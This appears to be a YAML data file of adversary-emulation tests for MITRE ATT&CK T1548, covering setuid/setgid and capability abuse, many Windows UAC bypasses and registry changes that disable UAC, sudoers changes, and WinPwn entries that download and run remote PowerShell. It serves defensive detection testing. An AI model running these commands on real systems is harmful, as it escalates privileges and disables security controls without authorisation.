    Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an "s" instead of an "x" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.[3](https://gtfobins.github.io/#+suid)
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - defense-evasion
  platforms:
    - linux
    - macos
  executors:
    - name: Make and modify binary from C source
      type: sh
      platform: macos
      command: |-
        cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c
        sudo chown root /tmp/hello.c
        sudo make /tmp/hello
        sudo chown root /tmp/hello
        sudo chmod u+s /tmp/hello
        /tmp/hello
      cleanup: |-
        sudo rm /tmp/hello
        sudo rm /tmp/hello.c
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Make and modify binary from C source
      type: sh
      platform: linux
      command: |-
        cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c
        sudo chown root /tmp/hello.c
        sudo make /tmp/hello
        sudo chown root /tmp/hello
        sudo chmod u+s /tmp/hello
        /tmp/hello
      cleanup: |-
        sudo rm /tmp/hello
        sudo rm /tmp/hello.c
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Make and modify binary from C source (freebsd)
      type: sh
      platform: linux
      command: |-
        cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c
        chown root /tmp/hello.c
        make /tmp/hello
        chown root /tmp/hello
        chmod u+s /tmp/hello
        /tmp/hello
      cleanup: |-
        rm /tmp/hello
        rm /tmp/hello.c
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Set a SetUID flag on file
      type: sh
      platform: macos
      command: |-
        sudo touch /tmp/evilBinary
        sudo chown root /tmp/evilBinary
        sudo chmod u+xs /tmp/evilBinary
      cleanup: sudo rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Set a SetUID flag on file
      type: sh
      platform: linux
      command: |-
        sudo touch /tmp/evilBinary
        sudo chown root /tmp/evilBinary
        sudo chmod u+xs /tmp/evilBinary
      cleanup: sudo rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Set a SetUID flag on file (freebsd)
      type: sh
      platform: linux
      command: |-
        touch /tmp/evilBinary
        chown root /tmp/evilBinary
        chmod u+xs /tmp/evilBinary
      cleanup: rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Set a SetGID flag on file
      type: sh
      platform: macos
      command: |-
        sudo touch /tmp/evilBinary
        sudo chown root /tmp/evilBinary
        sudo chmod g+xs /tmp/evilBinary
      cleanup: sudo rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Set a SetGID flag on file
      type: sh
      platform: linux
      command: |-
        sudo touch /tmp/evilBinary
        sudo chown root /tmp/evilBinary
        sudo chmod g+xs /tmp/evilBinary
      cleanup: sudo rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Set a SetGID flag on file (freebsd)
      type: sh
      platform: linux
      command: |-
        touch /tmp/evilBinary
        chown root /tmp/evilBinary
        chmod g+xs /tmp/evilBinary
      cleanup: rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Make and modify capabilities of a binary
      type: sh
      platform: linux
      command: |-
        cp PathToAtomicsFolder/T1548.001/src/cap.c /tmp/cap.c
        make /tmp/cap
        sudo setcap cap_setuid=ep /tmp/cap
        /tmp/cap
      cleanup: |-
        rm /tmp/cap
        rm /tmp/cap.c
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Provide the SetUID capability to a file
      type: sh
      platform: linux
      command: |-
        touch /tmp/evilBinary
        sudo setcap cap_setuid=ep /tmp/evilBinary
      cleanup: rm /tmp/evilBinary
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Do reconnaissance for files that have the setuid bit set
      type: sh
      platform: linux
      command: find /usr/bin -perm -4000
      timeout: 60
      is_safe: true
    - name: Do reconnaissance for files that have the setgid bit set
      type: sh
      platform: linux
      command: find /usr/bin -perm -2000
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1548/001
  is_safe: true
- id: T1548.002
  name: Bypass User Account Control
  description: |-
    Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.[1](https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works)

    If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.[2](https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx)[3](https://msdn.microsoft.com/en-us/library/ms679687.aspx) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[4](http://www.pretentiousname.com/misc/win7_uac_whitelist2.html)

    Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods[5](https://github.com/hfiref0x/UACME) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

    * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.[6](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)[7](https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware)

    Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.[8](http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass)
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: Bypass UAC using Event Viewer (cmd)
      type: cmd
      platform: windows
      command: |-
        reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
        cmd.exe /c eventvwr.msc
      cleanup: reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Bypass UAC using Event Viewer (PowerShell)
      type: powershell
      platform: windows
      command: |-
        New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
        Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
        Start-Process "C:\Windows\System32\eventvwr.msc"
      cleanup: Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Bypass UAC using Fodhelper
      type: cmd
      platform: windows
      command: |-
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
        fodhelper.exe
      cleanup: reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Bypass UAC using Fodhelper - PowerShell
      type: powershell
      platform: windows
      command: |-
        New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
        New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
        Start-Process "C:\Windows\System32\fodhelper.exe"
      cleanup: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Bypass UAC using ComputerDefaults (PowerShell)
      type: powershell
      platform: windows
      command: |-
        New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
        New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
        Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
        Start-Process "C:\Windows\System32\ComputerDefaults.exe"
      cleanup: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Bypass UAC by Mocking Trusted Directories
      type: cmd
      platform: windows
      command: |-
        mkdir "\\?\C:\Windows \System32\"
        copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe"
        mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
      cleanup: |-
        rd "\\?\C:\Windows \" /S /Q >nul 2>nul
        del "c:\testbypass.exe" >nul 2>nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Bypass UAC using sdclt DelegateExecute
      type: powershell
      platform: windows
      command: |-
        New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
        New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
        Start-Process -FilePath $env:windir\system32\sdclt.exe
        Start-Sleep -s 3
      cleanup: Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Disable UAC using reg.exe
      type: cmd
      platform: windows
      command: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
      cleanup: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Bypass UAC using SilentCleanup task
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1548.002\src\T1548.002.bat"'
      timeout: 120
      is_safe: true
    - name: UACME Bypass Method 23
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\23 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: UACME Bypass Method 31
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\31 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: UACME Bypass Method 33
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\33 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: UACME Bypass Method 34
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\34 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: UACME Bypass Method 39
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\39 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: UACME Bypass Method 56
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\56 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: UACME Bypass Method 59
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\59 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: UACME Bypass Method 61
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\uacme\61 Akagi64.exe"'
      cleanup: |-
        powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
        powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: WinPwn - UAC Magic
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic
      timeout: 120
      is_safe: true
    - name: WinPwn - UAC Bypass ccmstp technique
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp
      timeout: 120
      is_safe: true
    - name: WinPwn - UAC Bypass DiskCleanup technique
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
      timeout: 120
      is_safe: true
    - name: WinPwn - UAC Bypass DccwBypassUAC technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
      timeout: 120
      is_safe: true
    - name: Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key
      type: powershell
      platform: windows
      command: |-
        $orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
        Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
      cleanup: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: UAC Bypass with WSReset Registry Modification
      type: powershell
      platform: windows
      command: |-
        New-Item HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Force | Out-Null
        New-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c start cmd.exe" -Force -ErrorAction SilentlyContinue | Out-Null
        $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
      cleanup: Remove-Item HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Recurse -Force
      timeout: 120
      is_safe: true
    - name: Disable UAC - Switch to the secure desktop when prompting for elevation via registry key
      type: powershell
      platform: windows
      command: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
      cleanup: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Disable UAC notification via registry keys
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 1 /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 0 /f
      timeout: 120
      is_safe: true
    - name: Disable ConsentPromptBehaviorAdmin via registry keys
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
      cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
      timeout: 120
      is_safe: true
    - name: UAC bypassed by Utilizing ProgIDs registry.
      type: cmd
      platform: windows
      command: |-
        reg add "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /d "C:\Windows\System32\calc.exe" /f

        reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /d ".pwn" /f

        echo Triggering fodhelper.exe for potential privilege escalation...
        start fodhelper.exe
      cleanup: |-
        reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
        reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1548/002
  is_safe: true
- id: T1548.003
  name: Sudo and Sudo Caching
  description: |-
    Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

    Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command "allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."[1](https://www.sudo.ws/) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).

    The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.[2](https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/) Elevated privileges are required to edit this file though.

    Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.

    In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.[3](https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - defense-evasion
  platforms:
    - linux
    - macos
  executors:
    - name: Sudo usage
      type: sh
      platform: macos
      command: "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers"
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Sudo usage
      type: sh
      platform: linux
      command: "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers"
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Sudo usage (freebsd)
      type: sh
      platform: linux
      command: "sudo -l      \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers"
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Unlimited sudo cache timeout
      type: sh
      platform: macos
      command: |-
        sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
        sudo visudo -c -f /etc/sudoers
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Unlimited sudo cache timeout
      type: sh
      platform: linux
      command: |-
        sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
        sudo visudo -c -f /etc/sudoers
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Unlimited sudo cache timeout (freebsd)
      type: sh
      platform: linux
      command: |-
        sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
        sudo visudo -c -f /usr/local/etc/sudoers
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Disable tty_tickets for sudo caching
      type: sh
      platform: macos
      command: |-
        sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
        sudo visudo -c -f /etc/sudoers
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Disable tty_tickets for sudo caching
      type: sh
      platform: linux
      command: |-
        sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
        sudo visudo -c -f /etc/sudoers
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Disable tty_tickets for sudo caching (freebsd)
      type: sh
      platform: linux
      command: |-
        sudo sh -c "echo Defaults "'!'"tty_tickets >> /usr/local/etc/sudoers"
        sudo visudo -c -f /usr/local/etc/sudoers
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1548/003
  is_safe: false
